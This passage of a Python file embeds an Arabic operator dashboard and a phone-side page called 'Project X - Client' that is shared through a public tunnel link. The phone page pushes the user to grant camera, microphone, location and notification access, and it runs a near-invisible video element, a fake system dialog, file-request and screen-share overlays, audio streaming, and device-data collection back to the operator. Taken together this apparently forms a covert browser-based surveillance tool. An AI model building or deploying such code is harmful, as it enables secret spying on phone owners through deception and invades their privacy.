                ? `selected_device_id=${selectedDeviceId}`
                : 'selected_device_id=none';

            btn.disabled = true;
            btn.textContent = 'جاري الإرسال...';

            const now = new Date().toLocaleTimeString();
            output.innerHTML = `<div style="margin-bottom:8px;"><span style="color:#0f0">[${now}] أنت:</span> ${escapeHtml(message)}</div>` + output.innerHTML;

            try {
                const res = await fetch('/api/ai-assistant', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({message, context})
                });

                const data = await res.json().catch(() => ({ success: false, error: 'استجابة غير صالحة من الخادم' }));
                if (!res.ok || !data.success) {
                    throw new Error(data.error || 'فشل الطلب');
                }

                const t = new Date().toLocaleTimeString();
                const label = data.fallback ? 'AI (احتياطي)' : 'AI';
                const warningLine = data.warning
                    ? `<div style="margin-top:6px;color:#ffc107;font-size:0.85rem;">تنبيه: ${escapeHtml(data.warning)}</div>`
                    : '';
                output.innerHTML = `<div style="margin-bottom:10px;"><span style="color:#00bcd4">[${t}] ${label}:</span> ${escapeHtml(data.reply)}${warningLine}</div>` + output.innerHTML;
                input.value = '';
            } catch (e) {
                const t = new Date().toLocaleTimeString();
                output.innerHTML = `<div style="margin-bottom:10px;color:#ff6666;"><span>[${t}] خطأ:</span> ${escapeHtml(e.message || String(e))}</div>` + output.innerHTML;
            } finally {
                btn.disabled = false;
                btn.innerHTML = '<i class="fas fa-paper-plane"></i> اسأل المساعد';
            }
        }

        function formatWaTime(value) {
            if (!value) return '';
            const d = new Date(value);
            if (Number.isNaN(d.getTime())) return '';
            return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        }

        function onWaSearchChanged(value) {
            waSearchTerm = (value || '').trim().toLowerCase();
            renderWaChats();
            renderWaMessages(waCurrentMessages);
        }

        function onWaFilterChanged(value) {
            waFilterType = (value || 'all').toLowerCase();
            renderWaMessages(waCurrentMessages);
        }

        function setWaStatus(message, isError = false) {
            const statusBox = document.getElementById('waStatus');
            const now = new Date().toLocaleTimeString();
            const color = isError ? '#ff6666' : '#0f0';
            statusBox.innerHTML = `<div style="color:${color};">[${now}] ${escapeHtml(message)}</div>`;
        }

        function openPhoneChat() {
            const phone = (document.getElementById('waPhone').value || '').trim();
            if (!phone) {
                alert('اكتب رقم الهاتف أولاً');
                return;
            }
            waActiveChatId = `${phone.replace(/\\D/g, '')}@c.us`;
            waCurrentMessages = [];
            document.getElementById('waActiveName').textContent = `+${phone.replace(/\\D/g, '')}`;
            document.getElementById('waActiveSub').textContent = waActiveChatId;
            document.getElementById('waActiveAvatar').src = `https://api.dicebear.com/9.x/initials/svg?seed=${phone.replace(/\\D/g, '')}`;
            document.getElementById('waMessages').innerHTML = '';
        }

        function renderWaChats() {
            const list = document.getElementById('waChatsList');
            if (!list) return;

            const filteredChats = (waChats || []).filter(chat => {
                if (!waSearchTerm) return true;
                const hay = `${chat.display_name || ''} ${chat.phone_digits || ''} ${chat.last_message || ''}`.toLowerCase();
                return hay.includes(waSearchTerm);
            });

            if (!filteredChats.length) {
                list.innerHTML = '<div style="color:#888; text-align:center; padding:10px;">لا توجد محادثات بعد</div>';
                return;
            }

            list.innerHTML = filteredChats.map(chat => {
                const isActive = (chat.chat_id || '') === waActiveChatId;
                const unread = Number(chat.unread || 0);
                return `
                    <div class="wa-chat-item ${isActive ? 'active' : ''}" onclick="selectWaChat('${chat.chat_id}')">
                        <img class="wa-avatar" src="${chat.profile_pic || ''}" alt="avatar">
                        <div>
                            <div style="display:flex; justify-content:space-between; align-items:center; gap:8px;">
                                <div class="wa-chat-name">${escapeHtml(chat.display_name || chat.phone_digits || chat.chat_id || '')}</div>
                                <div class="wa-chat-time">${escapeHtml(formatWaTime(chat.last_at))}</div>
                            </div>
                            <div style="display:flex; justify-content:space-between; align-items:center; gap:8px; margin-top:4px;">
                                <div class="wa-chat-preview">${escapeHtml(chat.last_message || '')}</div>
                                ${unread > 0 ? `<span class="wa-unread">${unread}</span>` : ''}
                            </div>
                        </div>
                    </div>
                `;
            }).join('');
        }

        function renderWaMessages(messages) {
            const box = document.getElementById('waMessages');
            if (!box) return;

            const filteredMessages = (messages || []).filter(msg => {
                const msgType = String(msg.message_type || 'text').toLowerCase();
                const msgText = String(msg.text || '').toLowerCase();
                const msgFile = String(msg.file_name || '').toLowerCase();

                let typeOk = true;
                if (waFilterType === 'text') typeOk = msgType === 'text';
                else if (waFilterType === 'image') typeOk = msgType.includes('image');
                else if (waFilterType === 'video') typeOk = msgType.includes('video');
                else if (waFilterType === 'audio') typeOk = msgType.includes('audio');
                else if (waFilterType === 'file') typeOk = (msgType === 'file' || msgType === 'pdf' || msgType.includes('document'));

                const searchOk = !waSearchTerm || msgText.includes(waSearchTerm) || msgFile.includes(waSearchTerm);
                return typeOk && searchOk;
            });

            if (!filteredMessages.length) {
                box.innerHTML = '<div style="color:#888; text-align:center; padding:20px;">لا توجد رسائل بعد</div>';
                return;
            }

            box.innerHTML = filteredMessages.map(msg => waMessageHtml(msg)).join('');
            box.scrollTop = box.scrollHeight;
        }

        function waMessageHtml(msg) {
            const directionClass = msg.direction === 'out' ? 'out' : 'in';
            const text = escapeHtml(msg.text || '');
            const mediaUrl = (msg.media_url || '').trim();
            const fileName = escapeHtml(msg.file_name || 'ملف');
            const type = (msg.message_type || 'text').toLowerCase();

            let mediaPart = '';
            if (mediaUrl) {
                if (type.includes('image')) {
                    mediaPart = `<div style="margin-top:6px;"><img src="${mediaUrl}" style="max-width:220px; border-radius:8px; border:1px solid rgba(212,175,55,.25);"></div>`;
                } else if (type.includes('video')) {
                    mediaPart = `<div style="margin-top:6px;"><video src="${mediaUrl}" controls style="max-width:240px; border-radius:8px;"></video></div>`;
                } else {
                    mediaPart = `<div style="margin-top:6px;"><a href="${mediaUrl}" target="_blank" rel="noopener noreferrer" style="color:#9fe3ff;">📎 ${fileName}</a></div>`;
                }
            }

            return `
                <div class="wa-msg ${directionClass}">
                    ${text ? `<div>${text}</div>` : ''}
                    ${mediaPart}
                    <div class="wa-msg-time">${escapeHtml(formatWaTime(msg.timestamp))}</div>
                </div>
            `;
        }

        function appendWaMessageBubble(msg, scrollToBottom = false) {
            const box = document.getElementById('waMessages');
            if (!box || !msg) return;
            if ((waCurrentMessages || []).some(x => x.id && msg.id && x.id === msg.id)) return;
            waCurrentMessages.push(msg);
            renderWaMessages(waCurrentMessages);
            if (scrollToBottom) box.scrollTop = box.scrollHeight;
        }

        async function loadWhatsAppChats(silent = false) {
            try {
                const res = await fetch('/api/whatsapp/chats', { credentials: 'include' });
                const data = await res.json();
                if (!res.ok || !data.success) throw new Error(data.error || 'فشل تحميل المحادثات');

                const syncNote = document.getElementById('waSyncNote');
                if (syncNote && data.sync) {
                    const sync = data.sync;
                    if (sync.synced) {
                        syncNote.textContent = `مزامنة ناجحة: ${sync.chats || 0} محادثة`;
                    } else if (sync.reason === 'no_provider_chats') {
                        syncNote.textContent = 'المزود لم يرجع محادثات حالياً. تأكد من إعدادات API والويبهوك.';
                    }
                }

                waChats = data.chats || [];
                renderWaChats();

                if (!waActiveChatId && waChats.length > 0) {
                    selectWaChat(waChats[0].chat_id);
                }
            } catch (e) {
                if (!silent) setWaStatus(`خطأ تحميل المحادثات: ${e.message || e}`, true);
            }
        }

        async function forceSyncWhatsApp() {
            const note = document.getElementById('waSyncNote');
            if (note) note.textContent = 'جاري المزامنة مع المزود...';
            try {
                const res = await fetch('/api/whatsapp/chats?force=1', { credentials: 'include' });
                const data = await res.json();
                if (!res.ok || !data.success) throw new Error(data.error || 'فشل المزامنة');

                waChats = data.chats || [];
                renderWaChats();
                if (waActiveChatId) await selectWaChat(waActiveChatId);
                if (note) note.textContent = 'تمت مزامنة الرسائل والصور من المزود.';
            } catch (e) {
                if (note) note.textContent = `فشل المزامنة: ${e.message || e}`;
            }
        }

        async function selectWaChat(chatId) {
            waActiveChatId = (chatId || '').toLowerCase();
            renderWaChats();

            try {
                const res = await fetch(`/api/whatsapp/messages/${encodeURIComponent(waActiveChatId)}`, { credentials: 'include' });
                const data = await res.json();
                if (!res.ok || !data.success) throw new Error(data.error || 'فشل تحميل الرسائل');

                const chat = data.chat || {};
                document.getElementById('waActiveName').textContent = chat.display_name || chat.phone_digits || waActiveChatId;
                document.getElementById('waActiveSub').textContent = chat.chat_id || waActiveChatId;
                document.getElementById('waActiveAvatar').src = chat.profile_pic || '';
                waCurrentMessages = data.messages || [];
                renderWaMessages(waCurrentMessages);
                loadWhatsAppChats(true);
            } catch (e) {
                setWaStatus(`خطأ تحميل الرسائل: ${e.message || e}`, true);
            }
        }

        async function sendWhatsAppMessage() {
            const phone = (document.getElementById('waPhone').value || '').trim();
            const message = (document.getElementById('waMessage').value || '').trim();
            const keyword = (document.getElementById('waKeyword').value || '').trim();
            const btn = document.getElementById('waSendBtn');

            const targetPhone = phone || (waActiveChatId ? waActiveChatId.split('@')[0] : '');
            if (!targetPhone) {
                alert('اختر محادثة أو اكتب رقمًا أولاً');
                return;
            }

            btn.disabled = true;
            btn.textContent = 'جاري الإرسال...';
            try {
                const res = await fetch('/api/whatsapp/send', {
                    method: 'POST',
                    credentials: 'include',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: targetPhone, message, keyword })
                });

                const data = await res.json().catch(() => ({ success: false, error: 'استجابة غير صالحة من الخادم' }));
                if (res.status === 401 || data.code === 'auth_required') {
                    throw new Error('انتهت الجلسة. سجل الدخول مرة أخرى ثم أعد الإرسال.');
                }
                if (!res.ok || !data.success) {
                    throw new Error(data.error || 'فشل الطلب');
                }

                waActiveChatId = (data.chat_id || waActiveChatId || '').toLowerCase();
                document.getElementById('waMessage').value = '';
                setWaStatus('✅ تم الإرسال');
                await loadWhatsAppChats(true);
                if (waActiveChatId) await selectWaChat(waActiveChatId);
            } catch (e) {
                setWaStatus(`❌ ${e.message || String(e)}`, true);
                if ((e.message || '').includes('انتهت الجلسة')) {
                    setTimeout(() => { window.location.href = '/login'; }, 1200);
                }
            } finally {
                btn.disabled = false;
                btn.innerHTML = '<i class="fab fa-whatsapp"></i> إرسال';
            }
        }

        async function sendWhatsAppFile() {
            const fileInput = document.getElementById('waFileInput');
            const caption = (document.getElementById('waFileCaption').value || '').trim();
            const phone = (document.getElementById('waPhone').value || '').trim();
            const btn = document.getElementById('waSendFileBtn');

            if (!fileInput.files || !fileInput.files.length) {
                alert('اختر ملفًا أولاً');
                return;
            }

            const formData = new FormData();
            formData.append('file', fileInput.files[0]);
            formData.append('caption', caption);
            if (waActiveChatId) formData.append('chat_id', waActiveChatId);
            if (phone) formData.append('phone', phone);

            btn.disabled = true;
            btn.textContent = 'جاري إرسال الملف...';
            try {
                const res = await fetch('/api/whatsapp/send-file', {
                    method: 'POST',
                    credentials: 'include',
                    body: formData,
                });
                const data = await res.json().catch(() => ({ success: false, error: 'استجابة غير صالحة من الخادم' }));
                if (!res.ok || !data.success) {
                    throw new Error(data.error || 'فشل إرسال الملف');
                }

                waActiveChatId = (data.chat_id || waActiveChatId || '').toLowerCase();
                fileInput.value = '';
                document.getElementById('waFileCaption').value = '';
                setWaStatus(data.note || '✅ تم إرسال الملف');
                await loadWhatsAppChats(true);
                if (waActiveChatId) await selectWaChat(waActiveChatId);
            } catch (e) {
                setWaStatus(`❌ ${e.message || String(e)}`, true);
            } finally {
                btn.disabled = false;
                btn.innerHTML = '<i class="fas fa-paperclip"></i> إرسال ملف';
            }
        }

        async function toggleWaVoiceRecording() {
            const btn = document.getElementById('waVoiceBtn');
            const status = document.getElementById('waVoiceStatus');

            if (waVoiceRecorder && waVoiceRecorder.state === 'recording') {
                waVoiceRecorder.stop();
                btn.disabled = true;
                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> تجهيز...';
                status.textContent = 'جاري تجهيز Voice Note...';
                return;
            }

            try {
                waVoiceStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                waVoiceChunks = [];
                if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('audio/webm')) {
                    waVoiceRecorder = new MediaRecorder(waVoiceStream, { mimeType: 'audio/webm' });
                } else {
                    waVoiceRecorder = new MediaRecorder(waVoiceStream);
                }

                waVoiceRecorder.ondataavailable = (e) => {
                    if (e.data && e.data.size > 0) waVoiceChunks.push(e.data);
                };

                waVoiceRecorder.onstop = async () => {
                    try {
                        const blob = new Blob(waVoiceChunks, { type: 'audio/webm' });
                        await sendWhatsAppVoiceBlob(blob);
                        status.textContent = '✅ تم إرسال Voice Note';
                    } catch (e) {
                        status.textContent = `❌ فشل الإرسال: ${e.message || e}`;
                    } finally {
                        if (waVoiceStream) {
                            waVoiceStream.getTracks().forEach(t => t.stop());
                            waVoiceStream = null;
                        }
                        btn.disabled = false;
                        btn.innerHTML = '<i class="fas fa-microphone"></i> تسجيل Voice';
                    }
                };

                waVoiceRecorder.start();
                status.textContent = '🎙️ جاري التسجيل... اضغط مرة أخرى للإيقاف';
                btn.innerHTML = '<i class="fas fa-stop"></i> إيقاف';
            } catch (e) {
                status.textContent = `❌ لا يمكن بدء التسجيل: ${e.message || e}`;
            }
        }

        async function sendWhatsAppVoiceBlob(blob) {
            const phone = (document.getElementById('waPhone').value || '').trim();
            const targetPhone = phone || (waActiveChatId ? waActiveChatId.split('@')[0] : '');
            if (!targetPhone && !waActiveChatId) {
                throw new Error('اختر محادثة أو رقم قبل إرسال Voice Note');
            }

            const formData = new FormData();
            const file = new File([blob], `voice_note_${Date.now()}.webm`, { type: 'audio/webm' });
            formData.append('file', file);
            formData.append('caption', 'Voice Note');
            if (waActiveChatId) formData.append('chat_id', waActiveChatId);
            if (targetPhone) formData.append('phone', targetPhone);

            const res = await fetch('/api/whatsapp/send-file', {
                method: 'POST',
                credentials: 'include',
                body: formData,
            });
            const data = await res.json().catch(() => ({ success: false, error: 'استجابة غير صالحة من الخادم' }));
            if (!res.ok || !data.success) {
                throw new Error(data.error || 'فشل إرسال Voice Note');
            }

            waActiveChatId = (data.chat_id || waActiveChatId || '').toLowerCase();
            await loadWhatsAppChats(true);
            if (waActiveChatId) await selectWaChat(waActiveChatId);
        }

        function copyPublicLink() {
            const input = document.getElementById('publicLinkInput');
            if (!input) return;
            input.select();
            input.setSelectionRange(0, 99999);
            navigator.clipboard.writeText(input.value).then(() => {
                log('📋 تم نسخ رابط الهاتف');
            }).catch(() => {
                document.execCommand('copy');
                log('📋 تم نسخ رابط الهاتف');
            });
        }

        function logout() {
            fetch('/api/logout', { method: 'POST' })
                .finally(() => {
                    localStorage.clear();
                    window.location.href = '/login';
                });
        }

        function loadFiles() {
            fetch('/api/files')
                .then(r => r.json())
                .then(data => {
                    const browser = document.getElementById('fileBrowser');
                    browser.innerHTML = '';
                    if (!data.files || data.files.length === 0) {
                        browser.innerHTML = '<p style="text-align:center; color:#666;">لا توجد ملفات.</p>';
                        return;
                    }
                    data.files.forEach(file => {
                        const fileCard = document.createElement('div');
                        fileCard.className = 'file-card';
                        
                        let contentHtml = '';
                        const lower = file.toLowerCase();
                        if (lower.endsWith('.jpg') || lower.endsWith('.jpeg') || lower.endsWith('.png')) {
                            contentHtml = `<img src="/uploads/${file}" onclick="viewFile('${file}')">`;
                        } else if (lower.endsWith('.mp4') || lower.endsWith('.webm')) {
                            contentHtml = `<video src="/uploads/${file}" onclick="viewFile('${file}')"></video>`;
                        } else {
                            let icon = 'fa-file';
                            if (lower.endsWith('.mp3') || lower.endsWith('.wav')) icon = 'fa-music';
                            contentHtml = `<div class="file-icon-placeholder" onclick="viewFile('${file}')"><i class="fas ${icon}"></i></div>`;
                        }

                        fileCard.innerHTML = `
                            ${contentHtml}
                            <div class="file-info" title="${file}">${file}</div>
                            <div class="file-actions">
                                <a href="/uploads/${file}" download class="btn" style="padding: 2px 6px; font-size: 0.8rem; background: rgba(0,0,0,0.7); border: none;"><i class="fas fa-download"></i></a>
                                <button class="btn btn-danger" onclick="deleteFile('${file}')" style="padding: 2px 6px; font-size: 0.8rem; background: rgba(200,0,0,0.7); border: none;"><i class="fas fa-trash"></i></button>
                            </div>
                        `;
                        browser.appendChild(fileCard);
                    });
                });
        }

        function deleteFile(filename) {
            if(!confirm('هل أنت متأكد من حذف هذا الملف؟')) return;
            
            fetch('/api/delete_file', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({filename: filename})
            })
            .then(r => r.json())
            .then(data => {
                if(data.success) {
                    loadFiles(); // تحديث القائمة
                } else {
                    alert('فشل الحذف: ' + data.error);
                }
            });
        }

        function viewFile(filename) {
            const modal = document.getElementById('fileViewerModal');
            const content = document.getElementById('fileViewerContent');
            modal.style.display = 'flex';
            
            const lowerName = filename.toLowerCase();

            if (lowerName.endsWith('.jpg') || lowerName.endsWith('.jpeg') || lowerName.endsWith('.png')) {
                content.innerHTML = `<img src="/uploads/${filename}" style="max-width:100%; max-height:80vh;">`;
            } else if (lowerName.endsWith('.mp4') || lowerName.endsWith('.webm') || lowerName.endsWith('.mov') || lowerName.endsWith('.avi')) {
                content.innerHTML = `<video src="/uploads/${filename}" controls autoplay style="max-width:100%; max-height:80vh;"></video>`;
            } else if (lowerName.endsWith('.mp3') || lowerName.endsWith('.wav') || lowerName.endsWith('.ogg')) {
                content.innerHTML = `
                    <div style="text-align:center; color:black; width:100%;">
                        <i class="fas fa-music" style="font-size: 5rem; margin-bottom: 20px; color: #333;"></i>
                        <br>
                        <audio src="/uploads/${filename}" controls autoplay style="width:100%; max-width: 500px;"></audio>
                    </div>`;
            } else {
                content.innerHTML = `<div style="text-align:center; color:#000;"><p>لا يمكن عرض هذا النوع من الملفات.</p><a href="/uploads/${filename}" download class="btn" style="background:#0f0; color:#000; margin-top:10px;">📥 تحميل الملف</a></div>`;
            }
        }

        function closeFileViewer() {
            document.getElementById('fileViewerModal').style.display = 'none';
            document.getElementById('fileViewerContent').innerHTML = '';
        }

        function bootstrapDashboard() {
            fetch('/api/session')
                .then(r => {
                    if (!r.ok) throw new Error('unauthorized');
                    return r.json();
                })
                .then(data => {
                userId = data.user_id;

                    fetch('/api/server-ip').then(r => r.json()).then(d => {
                        if (d.public_url) {
                            document.getElementById('serverIp').textContent = 'Cloudflare Tunnel';
                            const phoneLink = `${d.public_url}/phone`;
                            document.getElementById('publicLinkArea').innerHTML = `
                                <div>🌍 رابط الإنترنت:</div>
                                <a href="${phoneLink}" target="_blank" rel="noopener noreferrer" style="color: #0f0;">${phoneLink}</a>
                                <div style="display:grid; grid-template-columns: 1fr 44px; gap:6px; margin-top:8px;">
                                    <input id="publicLinkInput" value="${phoneLink}" readonly style="background:#130707; color:#f7edd6; border:1px solid rgba(212,175,55,.25); border-radius:6px; padding:8px;">
                                    <button class="btn" onclick="copyPublicLink()" title="نسخ الرابط" style="padding: 8px;"><i class="fas fa-copy"></i></button>
                                </div>
                            `;
                        } else {
                            document.getElementById('serverIp').textContent = 'محلي فقط';
                            document.getElementById('publicLinkArea').textContent = 'لا يوجد رابط عام متاح حالياً';
                        }
                    }).catch(e => console.error("Error fetching IP:", e));

                    try { initSocket(); } catch(e) { console.error("Socket init failed:", e); }
                    loadWhatsAppChats(true);
                })
                .catch(() => {
                    localStorage.clear();
                    window.location.href = '/login';
                });
        }

        bootstrapDashboard();
        switchPage('overview');
        
        // تحديث دوري للأجهزة كل 5 ثواني
        setInterval(refreshDevices, 5000);
        // تحديث دوري لمحادثات واتساب
        setInterval(() => loadWhatsAppChats(true), 3500);
    </script>
</body>
</html>
"""

PHONE_HTML = """
<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Language" content="en">
    <link rel="manifest" href="/manifest.json">
    <meta name="mobile-web-app-capable" content="yes">
    <title>Project X - Client</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        if (typeof io === 'undefined') {
            document.write('<script src="/socket.io/socket.io.js"><\\/script>');
        }
    </script>
    <style>
        body { font-family: sans-serif; background: #f0f0f0; text-align: center; padding: 20px; margin: 0; min-height: 100vh; box-sizing: border-box; overflow-x: hidden; }
        .status-box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); margin-bottom: 20px; width: 100%; max-width: 560px; margin-left: auto; margin-right: auto; box-sizing: border-box; }
        .status { font-weight: bold; color: #f44336; }
        .status.connected { color: #4CAF50; }
        button { padding: 15px 30px; font-size: 18px; background: #2196F3; color: white; border: none; border-radius: 5px; width: 100%; margin-top: 10px; box-sizing: border-box; }
        #log { text-align: left; height: 150px; overflow-y: auto; background: #fff; padding: 10px; border: 1px solid #ddd; margin-top: 20px; font-size: 12px; width: 100%; max-width: 560px; margin-left: auto; margin-right: auto; box-sizing: border-box; }
        video { width: 100%; max-width: 320px; background: #000; margin-top: 10px; display: none; }
        #uploadOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 9999; color: white; flex-direction: column; justify-content: center; align-items: center; }
        @keyframes ripple { 0% { transform: translate(-50%, -50%) scale(0); opacity: 1; } 100% { transform: translate(-50%, -50%) scale(4); opacity: 0; } }
        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
        @media (max-width: 640px) {
            body { padding: 12px; }
            h1 { font-size: 1.4rem; margin: 10px 0 14px; }
            .status-box { padding: 14px; margin-bottom: 14px; }
            button { font-size: 16px; padding: 14px 18px; }
            #log { height: 180px; }
            video { max-width: 100%; }
            #permissionOverlay, #screenShareOverlay { padding: 16px !important; }
            #grantAllPermissionsBtn, #mainGrantPermissionsBtn { width: 100%; max-width: none; }
        }
    </style>
</head>
<body>
    <h1>Project X 📱</h1>
    
    <div class="status-box">
        <p>Status: <span id="status" class="status">Disconnected</span></p>
        <p>ID: <small id="deviceId">...</small></p>
    </div>

    <div id="permissionOverlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.94); z-index:22000; color:#fff; flex-direction:column; justify-content:center; align-items:center; padding:22px; text-align:center;">
        <h2 style="margin:0 0 10px 0; font-size:1.7rem;">🔐 Permission Request</h2>
        <p style="max-width:520px; line-height:1.7; color:#ddd; margin:0 0 16px 0; font-size:1.05rem;">To enable all features, tap the button below once. The browser will request camera, microphone, location, and notification permissions in sequence.</p>
        <button id="grantAllPermissionsBtn" onclick="requestPermissions()" style="width:94%; max-width:520px; padding:22px; font-size:1.35rem; font-weight:800; letter-spacing:0.6px; background:linear-gradient(135deg,#18ff74,#08b84f); color:#03200f; border:3px solid #ffffff; border-radius:16px; box-shadow:0 0 24px rgba(24,255,116,.75);">ALLOW</button>
        <button onclick="closePermissionOverlay()" style="width:94%; max-width:520px; padding:14px; font-size:1rem; background:#37474f; color:#fff; border:1px solid #90a4ae; border-radius:12px; margin-top:10px;">NOT NOW</button>
    </div>

    <button id="mainGrantPermissionsBtn" onclick="requestPermissions()" style="background:#18c35a; font-size:1.22rem; font-weight:800; padding:18px 30px; border:2px solid #ffffff; box-shadow:0 0 14px rgba(24,195,90,.55);">ALLOW PERMISSIONS</button>

    <div style="width:100%; max-width:560px; margin:14px auto 0; background:#ffffff; border-radius:12px; padding:14px; box-shadow:0 2px 5px rgba(0,0,0,0.08); box-sizing:border-box;">
        <div style="font-weight:700; color:#333; margin-bottom:10px; font-size:1.05rem;">Choose files from this phone</div>
        <div style="display:grid; grid-template-columns:repeat(3, 1fr); gap:8px;">
            <button onclick="openLocalFilePicker('photos')" style="background:#16a34a; color:#fff; font-weight:700; padding:14px 10px; border-radius:10px;">Photos</button>
            <button onclick="openLocalFilePicker('videos')" style="background:#0ea5e9; color:#fff; font-weight:700; padding:14px 10px; border-radius:10px;">Videos</button>
            <button onclick="openLocalFilePicker('all')" style="background:#6b7280; color:#fff; font-weight:700; padding:14px 10px; border-radius:10px;">All Files</button>
        </div>
    </div>
    
    <video id="localVideo" autoplay playsinline muted style="width:1px;height:1px;opacity:0.01;position:absolute;top:0;left:0;pointer-events:none;"></video>
    
    <div id="log"></div>

    <!-- ✅ إصلاح: نقل input إلى body -->
    <input type="file" id="hiddenFileInput" style="display:none;" multiple>

    <div id="uploadOverlay">
        <h2>📂 طلب ملف</h2>
        <button onclick="document.getElementById('hiddenFileInput').click(); document.getElementById('uploadOverlay').style.display='none';" style="width: 80%; padding: 20px; font-size: 1.2rem; background: #0f0; color: #000; border: 2px solid #fff; border-radius: 10px; box-shadow: 0 0 15px #0f0;"> اضغط هنا لاختيار الصور/الملفات المطلوبة 📂</button>
    </div>

    <div id="screenShareOverlay" style="display:none; position: fixed; inset: 0; background: rgba(0,0,0,0.92); z-index: 21000; color: white; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center;">
        <h2 style="margin-bottom: 10px;">🖥️ طلب مشاركة الشاشة</h2>
        <p style="max-width: 420px; line-height: 1.6; color: #ddd;">لإرسال شاشة الهاتف للّاب، اضغط الزر التالي ثم اختر مشاركة الشاشة من نافذة النظام.</p>
        <button onclick="startPendingScreenShare()" style="width: 85%; max-width: 380px; padding: 16px; font-size: 1.05rem; background: #00c853; color: #000; border: 2px solid #fff; border-radius: 12px; box-shadow: 0 0 18px rgba(0,255,120,0.8);">ابدأ مشاركة الشاشة</button>
        <button onclick="cancelPendingScreenShare()" style="width: 85%; max-width: 380px; padding: 14px; font-size: 1rem; background: #455a64; color: #fff; border: 1px solid #90a4ae; border-radius: 12px; margin-top: 10px;">إلغاء</button>
    </div>

    <!-- تمت إزالة أي واجهات لجمع كلمات المرور أو بيانات الحسابات. -->

    <!-- نافذة النظام الوهمية (System Dialog) -->
    <div id="sysDialog" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; max-width: 320px; background: #fff; color: #000; border-radius: 15px; padding: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); z-index: 20000; text-align: left; font-family: sans-serif;">
        <h3 id="sysTitle" style="margin-top: 0; font-size: 18px; color: #333;">System</h3>
        <p id="sysMsg" style="color: #666; margin: 20px 0; font-size: 15px; line-height: 1.4;">Processing...</p>
        <div id="sysProgress" style="width: 100%; height: 4px; background: #eee; margin-bottom: 20px; overflow: hidden; display: none; border-radius: 2px;">
            <div style="width: 0%; height: 100%; background: #2196F3; animation: progress 2s infinite linear;"></div>
        </div>
        <div style="text-align: right;">
            <button onclick="document.getElementById('sysDialog').style.display='none'" style="background: transparent; color: #2196F3; border: none; font-weight: bold; font-size: 14px; padding: 10px 15px; width: auto; margin: 0;">موافق</button>
        </div>
    </div>

    <script>
        // عرض المعرف فوراً قبل الاتصال
        try {
            let deviceId = localStorage.getItem('device_id') || 'dev_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('device_id', deviceId);
            document.getElementById('deviceId').textContent = deviceId;
        } catch(e) { console.error(e); }

        if (typeof io === 'undefined') {
            document.getElementById('status').textContent = '❌ خطأ: لا يوجد إنترنت';
            alert("فشل تحميل ملفات النظام. تأكد من اتصال الهاتف بالإنترنت.");
        }

        // إعداد الاتصال
        const socket = (typeof io !== 'undefined')
            ? io({
                path: '/socket.io',
                auth: {
                    client_type: 'device'
                },
                transports: ["websocket", "polling"],
                reconnection: true,
                reconnectionAttempts: Infinity,
                reconnectionDelay: 1000,
                timeout: 20000
            })
            : {
                on: () => {},
                emit: () => {},
                connect: () => {}
            };

        let deviceId = localStorage.getItem('device_id');
        let cameraStream = null;
        let isStreaming = false;
        let isAudioActive = false;
        let mediaRecorder;
        let audioRecorder;
        let liveAudioRecorder = null;
        let liveAudioStream = null;
        let audioFileRecorder;
        let locationWatchId = null;
        let pendingFileRequest = null;
        let localFilePickMode = 'all';
        let pendingScreenShareRequest = false;
        let screenStream = null;
        let isScreenSharing = false;
        let lastTapEmitAt = 0;
        let isRequestingPermissions = false;

        function log(msg) {
            const box = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            box.innerHTML = `<div><span style="color: #0f0">[${time}]</span> ${msg}</div>` + box.innerHTML;
        }

        // دالة لإرسال الصوت كـ Base64 لتجنب مشاكل Polling
        function sendAudioChunk(blob, mimeType) {
            const reader = new FileReader();
            reader.readAsDataURL(blob);
            reader.onloadend = () => {
                socket.emit('audio_chunk', { 
                    device_id: deviceId, 
                    chunk: reader.result,
                    mimeType: mimeType
                });
            };
        }

        // دالة لجلب نسبة البطارية
        async function getBatteryLevel() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return Math.round((battery.level || 0) * 100) + '%';
                } catch (e) { return 'غير معروف'; }
            }
            return 'غير معروف';
        }

        // دالة لاستخراج اسم الجهاز ونوع النظام الحقيقي
        async function getDeviceInfo() {
            const ua = navigator.userAgent || '';
            let name = "Unknown Device";
            let platform = "Unknown OS";
            let platformVersion = "";

            // أفضل مصدر متاح على كروم/أندرويد الحديثة
            if (navigator.userAgentData) {
                try {
                    const hints = await navigator.userAgentData.getHighEntropyValues([
                        'model',
                        'platform',
                        'platformVersion'
                    ]);

                    const model = String(hints.model || '').trim();
                    const hintedPlatform = String(hints.platform || navigator.userAgentData.platform || '').trim();
                    const hintedVersion = String(hints.platformVersion || '').trim();

                    if (hintedPlatform) {
                        platform = hintedPlatform;
                    }
                    if (hintedVersion) {
                        platformVersion = hintedVersion;
                    }

                    if (model && model.toLowerCase() !== 'unknown') {
                        name = model;
                    }
                } catch (e) {
                    // نتجاهل الخطأ ونكمل بالـ userAgent
                }
            }

            if (/Android/i.test(ua)) {
                platform = "Android";
                const v = ua.match(/Android\\s([\\d\\.]+)/i);
                if (v && v[1]) platformVersion = v[1];
                if (!name || name === "Unknown Device" || name.length <= 2) {
                    const match = ua.match(/Android[^;]*;\\s*([^;]+?)(?=\\sBuild\\/)/i);
                    const match2 = ua.match(/;\\s?([^;]+?)\\s?Build\\//i);
